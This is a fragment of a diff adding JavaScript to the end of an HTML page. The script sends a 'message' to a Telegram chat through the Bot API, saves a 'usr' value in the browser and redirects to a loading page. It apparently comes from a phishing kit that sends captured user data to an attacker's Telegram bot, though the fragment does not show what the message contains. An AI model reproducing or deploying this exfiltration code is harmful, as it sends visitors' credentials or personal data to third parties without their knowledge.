+    url: `https://api.telegram.org/bot${token}/sendMessage`,
+    data: {
+      chat_id: chatId,
+      text: message,
+      parse_mode: "html",
+    },
+    success: function (res) {
+      console.debug(res);
+      $("#response").text("Message sent");
+      console.log("enviado");
+      localStorage.setItem("usr", usr);
+      
+      window.location = "../load.html";
+    },
+    error: function (error) {
+      console.error(error);
+      alert("error failed");
+    },
+  });
+}
+    </script>
+
+	
+	</html>
+
+
+
